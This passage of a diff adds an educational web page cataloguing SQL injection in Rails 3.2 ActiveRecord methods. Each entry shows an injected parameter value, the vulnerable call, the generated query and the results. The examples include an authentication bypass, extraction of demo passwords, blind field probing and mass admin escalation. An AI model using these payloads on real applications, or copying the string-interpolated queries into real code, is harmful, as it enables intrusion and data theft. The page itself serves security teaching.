+<span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.all(<span style="color:#A60">:conditions</span> =&gt; { <span style="color:#A60">:user_id</span> =&gt; <span style="color:#00D">1</span> }, <span style="color:#A60">:group</span> =&gt; <span style="color:#A60">:user_id</span>, <span style="color:#A60">:having</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">total &gt; </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:total</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> user_id <span style="color:#080;font-weight:bold">HAVING</span> total &gt; <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders</span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;Order id: 25, user_id: 1, total: 10, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 26, user_id: 3, total: 500, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 27, user_id: 4, total: 1, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="joins">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-joins">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Joins Method</h3>
+
+  <div>
+    <p>The <code>joins</code> method can take an array of associations or straight SQL strings.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Skip WHERE clause and return all orders instead of just the orders for the specified user.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:table</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">--</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.where(<span style="color:#A60">:user_id</span> =&gt; <span style="color:#00D">1</span>).joins(params[<span style="color:#A60">:table</span>])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span> <span style="color:#777">-- WHERE &quot;orders&quot;.&quot;user_id&quot; = 1</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;Order id: 28, user_id: 1, total: 10, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 29, user_id: 3, total: 500, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;Order id: 30, user_id: 4, total: 1, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="lock">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-lock">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Lock Method and Option</h3>
+
+  <div>
+    <p>The <code>lock</code> method and the <code>:lock</code> option for <code>find</code> and related methods accepts a SQL fragment.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Not a real example: SQLite does not support this option.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:lock</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">?</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.where(<span style="color:#00D">1</span>).lock(params[<span style="color:#A60">:lock</span>])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (<span style="color:#00D">1</span>)</span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;User id: 61, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 46, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 62, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 30, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 63, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 32, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 64, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 75, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 65, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 21, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 66, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 67, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="order">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-order">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Order Method</h3>
+
+  <div>
+    <p>The <code>order</code> method accepts any SQL string.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Taking advantage of SQL injection in <code>ORDER BY</code> clauses is tricky, but a <code>CASE</code> statement can be used to test other fields, switching the sort column for true or false. While it can take many queries, an attacker can determine the value of the field.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:sortby</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">(CASE SUBSTR(password, 1, 1) WHEN 's' THEN 0 else 1 END)</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.order(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:sortby</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20"> ASC</span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">ORDER</span> <span style="color:#080;font-weight:bold">BY</span> (<span style="color:#080;font-weight:bold">CASE</span> SUBSTR(password, <span style="color:#00D">1</span>, <span style="color:#00D">1</span>) <span style="color:#080;font-weight:bold">WHEN</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">s</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">THEN</span> <span style="color:#00D">0</span> <span style="color:#080;font-weight:bold">else</span> <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">END</span>) <span style="color:#088;font-weight:bold">ASC</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [#&lt;User id: 72, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 21, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 67, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 22, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 68, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 42, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 69, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 77, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 70, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 29, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;, #&lt;User id: 71, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 43, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="order_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Order Option</h3>
+
+  <div>
+    <p>The <code>:order</code> option, like the method, will accept any SQL string.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Since <code>ORDER BY</code> clauses can accept a column index, they can be used to determine the number of columns in the table. The index can be incremented until the query returns an error.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:sort</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">,8</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.all(<span style="color:#A60">:order</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:sort</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">ORDER</span> <span style="color:#080;font-weight:bold">BY</span> name ,<span style="color:#00D">8</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      SQLite3::SQLException: 2nd ORDER BY term out of range - should be between 1 and 7: SELECT &quot;users&quot;.* FROM &quot;users&quot;  ORDER BY name ,8
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="pluck">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Calculations.html#method-i-pluck">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Pluck Method</h3>
+
+  <div>
+    <p>The <code>pluck</code> method is intended to select a specific column from a table. Instead, it accepts any SQL statement at all. This allows an attacker to completely control the query from <code>SELECT</code> onwards.</p>
+
+<p>However, the return result will still be an array of values from a single column.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Output the passwords from the users table.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:column</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">password FROM users--</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">Order</span>.pluck(params[<span style="color:#A60">:column</span>])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> password <span style="color:#080;font-weight:bold">FROM</span> users<span style="color:#777">-- FROM &quot;orders&quot; </span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      [&quot;Bobpass&quot;, &quot;Jimpass&quot;, &quot;Sarahpass&quot;, &quot;Tinapass&quot;, &quot;Tonypass&quot;, &quot;supersecretpass&quot;]
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="reorder">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-reorder">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Reorder Method</h3>
+
+  <div>
+    <p>The <code>reorder</code> method is not very common, but it accepts any SQL fragment just like the <code>order</code> method.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>The <code>reorder</code> method is vulnerable to the same type of injection attacks as <code>order</code>.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:order</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">, 8</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.order(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name DESC</span><span style="color:#710">&quot;</span></span>).reorder(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">id </span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:order</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#710">&quot;</span></span>)</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">ORDER</span> <span style="color:#080;font-weight:bold">BY</span> id , <span style="color:#00D">8</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      SQLite3::SQLException: 2nd ORDER BY term out of range - should be between 1 and 7: SELECT &quot;users&quot;.* FROM &quot;users&quot;  ORDER BY id , 8
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="select_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/FinderMethods.html#method-i-find">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Select Option</h3>
+
+  <div>
+    <p>The <code>:select</code> option allows complete control over the <code>SELECT</code> clause of the query.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Since the <code>SELECT</code> clause is at the beginning of the query, nearly any SQL can be injected.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:column</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">* FROM users WHERE admin = 't' ;</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.first(<span style="color:#A60">:conditions</span> =&gt; { <span style="color:#A60">:name</span> =&gt; params[<span style="color:#A60">:name</span>], <span style="color:#A60">:password</span> =&gt; params[<span style="color:#A60">:password</span>] }, <span style="color:#A60">:select</span> =&gt; params[<span style="color:#A60">:column</span>])</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  * <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span> ; <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">IS</span> <span style="color:#069">NULL</span> <span style="color:#080;font-weight:bold">AND</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">password</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">IS</span> <span style="color:#069">NULL</span> LIMIT <span style="color:#00D">1</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      #&lt;User id: 96, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 28, admin: true, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="where">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/QueryMethods.html#method-i-where">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Where Method</h3>
+
+  <div>
+    <p>The <code>where</code> method can be passed a straight SQL string. Calls using a hash of name-value pairs are escaped, and the array form can be used for safely parameterizing queries as with the <code>find</code> method.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>The example below is using classic SQL injection to bypass authentication.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:name</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">') OR 1--</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.where(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:name</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">' AND password = '</span><span style="background-color:hsla(0,0%,0%,0.07);color:black"><span style="font-weight:bold;color:#666">#{</span>params[<span style="color:#A60">:password</span>]<span style="font-weight:bold;color:#666">}</span></span><span style="color:#D20">'</span><span style="color:#710">&quot;</span></span>).first</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span><span style="color:#777">--' AND password = '') LIMIT 1</span></span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      #&lt;User id: 97, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 44, admin: false, created_at: &quot;2016-01-19 06:31:03&quot;, updated_at: &quot;2016-01-19 06:31:03&quot;&gt;
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td>
+      <div id="update_all_order_option">
+  <div>
+    <p class="pull-right">
+      <a href="http://api.rubyonrails.org/v3.2.22/classes/ActiveRecord/Relation.html#method-i-update_all">Documentation <i class="icon-share"></i></a>
+    </p>
+  </div>
+
+  <h3>Update All Order Option</h3>
+
+  <div>
+    <p>The <code>update_all</code> method accepts two options: <code>:order</code> and <code>:limit</code>. <code>:limit</code> is cast to an integer and is safe from injection. The <code>:order</code> option, however, will accept any SQL string.</p>
+
+  </div>
+
+  <h4>Example</h4>
+  <p>
+    <p>Since the query is encasing the <code>IN</code> clause in parentheses, we can easily close that clause with a parenthesis and append almost any SQL.</p>
+
+  </p>
+
+  <div style="margin-bottom: 4px">
+      <pre>
+<span class="CodeRay">params[<span style="color:#A60">:order</span>] = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name) OR 1=1;</span><span style="color:#710">&quot;</span></span></span>
+<span class="CodeRay"><span style="color:#036;font-weight:bold">User</span>.update_all(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">admin = 1</span><span style="color:#710">&quot;</span></span>, <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name LIKE 'B%'</span><span style="color:#710">&quot;</span></span> , { <span style="color:#A60">:order</span> =&gt; params[<span style="color:#A60">:order</span>] })</span></pre>
+  </div>
+
+  <div class="result well">
+    <strong>Query</strong>
+    <div>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">UPDATE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span> <span style="color:#B06;font-weight:bold">SET</span> admin = <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">id</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">IN</span> (<span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">id</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name <span style="color:#080;font-weight:bold">LIKE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">B%</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">ORDER</span> <span style="color:#080;font-weight:bold">BY</span> name) <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span>=<span style="color:#00D">1</span>;)</span>
+    </div>
+    <strong>Result</strong>
+    <div>
+      6
+    </div>
+  </div>
+</div>
+
+    </td>
+  </tr>
+</table>
+
+  </div>
+  <hr>
+  <div class="container" id="resources" style="padding-bottom:80px">
+    <h2>More Resources</h2>
+    <ul>
+      <li><a href="http://blog.codeclimate.com/blog/2013/03/27/rails-insecure-defaults/">Insecure Defaults in Rails</a></li>
+      <li><a href="http://guides.rubyonrails.org/security.html">Official Rails Security Guide</a></li>
+      <li><a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet">OWASP Rails Cheatsheet</a></li>
+      <li><a href="https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-security">Rails Security Mailing List</a></li>
+      <li><a href="http://brakemanscanner.org">Brakeman - Static Analysis Security Tool for Rails</a></li>
+      <li><a href="https://github.com/twitter/secureheaders#readme">Secure Headers Gem</a></li>
+      <li><a href="https://codeclimate.com/security-monitor">Code Climate Security Monitor</a></li>
+    </ul>
+    <p>
+      This site is also available as a Rails application. To interact with this site dynamically and try out different SQL injection attacks you can <a href="https://github.com/presidentbeef/inject-some-sql">clone the code</a> and run it locally. Contributions and corrections are welcome!
+    </p>
+  </div>
+</body>
+  <script type="text/javascript">
+
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-20920647-4']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+     var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+     ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+     var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+     })();
+
+</script>
+</html>
